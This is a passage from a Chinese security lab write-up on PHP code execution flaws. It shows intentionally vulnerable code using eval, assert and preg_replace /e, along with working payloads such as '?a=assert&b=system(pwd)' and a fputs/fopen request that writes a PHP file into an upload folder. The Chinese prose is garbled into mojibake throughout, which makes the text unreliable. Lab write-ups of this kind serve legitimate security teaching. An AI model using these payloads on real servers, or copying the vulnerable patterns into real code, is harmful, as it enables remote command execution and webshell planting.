# ä»£ç æ‰§è¡Œæ¼æ´

åº”ç”¨éœ€è¦è°ƒç”¨ç³»ç»Ÿå‡½æ•°æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œå½“ç”¨æˆ·å¯ä»¥æ§åˆ¶è¾“å…¥çš„å‚æ•°ï¼Œåˆ™å°±å¯èƒ½å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´ã€‚

å„è¯­è¨€ç›¸å…³å‡½æ•°ï¼š

* PHPï¼ševal()ã€assert()ã€preg_replace()

* pythonï¼šexec()ã€system()
* JAVAï¼šæ²¡æœ‰ç±»ä¼¼äºå‰é¢ä¸¤è€…çš„å‡½æ•°ï¼Œä½†æ˜¯æœ‰åå°„æœºåˆ¶ï¼Œå¹¶ä¸”æœ‰åŸºäºåå°„æœºåˆ¶çš„è¡¨è¾¾å¼å¼•æ“ï¼Œå¦‚ï¼š0GNLã€SpELã€MVELç­‰ã€‚



## ç¤ºä¾‹

æ¥åˆ°æµ‹è¯•é¡µé¢è¿›è¡Œæµ‹è¯•ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ä¼ å‚çš„æ—¶å€™ï¼Œä¼ å…¥äº†ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­`m_print()`ï¼Œæ˜¯å¦æ„å‘³ç€è¿™æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Ÿ

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823083717.png)

é‚£ä¹ˆæˆ‘ä»¬å°è¯•å°†å‚æ•°ä¿®æ”¹ä¸º`phpinfo()`çœ‹çœ‹ã€‚

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823084028.png)

å¹¶ä¸”ç»§ç»­å°è¯•æ‰§è¡Œphpçš„å…¶ä»–ç³»ç»Ÿè°ƒç”¨å‡½æ•°çœ‹çœ‹ç»“æœ

```
?a=assert&b=eval(pwd)
```

å‘ç°æµè§ˆå™¨å¹¶æ²¡æœ‰ä»»ä½•è¾“å‡ºï¼Œå¾ˆå¥‡æ€ªï¼Œé‚£å°±æŸ¥çœ‹ä¸€ä¸‹æºç ã€‚

```
<?php
function m_print(){
        echo 'è¿™æ˜¯ä¸€ä¸ªé¡µé¢';
}
$_GET['a']($_GET['b']);
?>
```

æŒ‰ç…§ä»£ç å¯ä»¥å¾—åˆ°çš„æœ€ç»ˆæ‰§è¡Œçš„ä»£ç 

```
assert(eval(pwd))
```

è€Œä¸‹é¢è¿™ä¸ªå´å¯ä»¥æ‰§è¡ŒæˆåŠŸã€‚

```
?a=assert&b=system(pwd)
```

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823205007.png)

æš‚æ—¶è¿˜ä¸æ˜æ‰€ä»¥ï¼Œå…ˆç»§ç»­æµ‹å…¶ä»–æ¼æ´ã€‚

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823210541.png)

æœ¬æ¥æ˜¯ä»£ç æ‰§è¡Œæ¼æ´çš„ï¼Œçœ‹äº†ä¸‹æºç ï¼Œå‘ç°ä¹Ÿå¯ä»¥æä¸ªxssæ”»å‡»ï¼ˆæ‰‹åŠ¨ğŸ˜‚ï¼‰ã€‚

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823210407.png)

å›å½’ä¸»é¢˜ï¼Œç»§ç»­å°è¯•æ„é€ ä»£ç æ‰§è¡Œçš„payloadã€‚

```
http://www.webtester.com/code/code02.php?data=system(id)
```

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823211215.png)

å‘ç°å¹¶æ²¡æœ‰å‡ºç°æˆ‘ä»¬æœŸå¾…çš„ç»“æœï¼Œå†æ¬¡æŸ¥çœ‹æºç 

```
<?php
$data = isset($_GET['data'])?$_GET['data']:'è¿™æ˜¯ä¸€ä¸ªevalæ¼æ´é¡µé¢';
@eval($ret = $data);
echo $ret;
?>
```

> åæ§½ä¸€åˆ»ï¼šçœŸæœ‰äººèƒ½æŠŠä»£ç å†™æˆè¿™æ ·çš„å—ï¼Ÿ

ç„¶åå‘ç°æ·»åŠ åˆ†å·`;`äº§ç”Ÿä¸€ä¸ªæˆªæ–­ä¹‹åï¼Œå°±æˆåŠŸäº†ã€‚

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823212038.png)

ä¹Ÿå¯ä»¥é€šè¿‡ä»£ç æ‰§è¡Œæ¼æ´å†™å…¥shellè„šæœ¬æ–‡ä»¶ï¼Œå…ˆç¡®å®šè·¯å¾„å’Œæ–‡ä»¶ã€‚

```
$ ll ../upload | grep shell*
-rw-r--r--  1 www-data www-data    18  4æœˆ  6  2019 shell.php
```

æ„é€ payload

```
?data=fputs(fopen("../upload/shell2.php","a"),"<?php phpinfo();?>");
```

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823214828.png)

åˆ°æœåŠ¡å™¨ä¸­æŸ¥çœ‹æ‰§è¡Œç»“æœ

```
$ ll ../upload | grep shell*
-rw-r--r--  1 www-data www-data    18  8æœˆ 23 21:48 shell2.php
-rw-r--r--  1 www-data www-data    18  4æœˆ  6  2019 shell.php
```

è®¿é—®é¡µé¢çœ‹çœ‹

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823215130.png)

ç»§ç»­ä¸‹ä¸€ä¸ªé¡µé¢è¿›è¡Œæµ‹è¯•

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823213410.png)

å‘ç°æ˜¯æŠŠè¾“å…¥çš„å†…å®¹è¾“å‡ºåˆ°äº†URLä¸Šï¼ŒæŸ¥çœ‹æºç ã€‚

```
<?php
$data = $_GET['data'];
preg_replace('/<data>(.*)<\/data>/e','$ret ="\\1";',$data);
?>
```

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823213938.png)

